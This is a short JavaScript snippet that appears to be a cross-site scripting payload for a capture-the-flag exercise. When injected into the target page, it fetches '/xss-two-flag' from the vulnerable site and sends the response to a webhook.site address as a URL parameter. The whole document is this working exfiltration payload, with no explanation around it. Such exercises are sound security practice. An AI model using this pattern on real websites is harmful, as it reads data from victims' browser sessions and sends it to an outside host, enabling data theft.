fetch('/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
    fetch('https://webhook.site/cf758e55-f9ce-47be-a51d-5950b978c6c1?flag=' + encodeURIComponent(flag));
  });
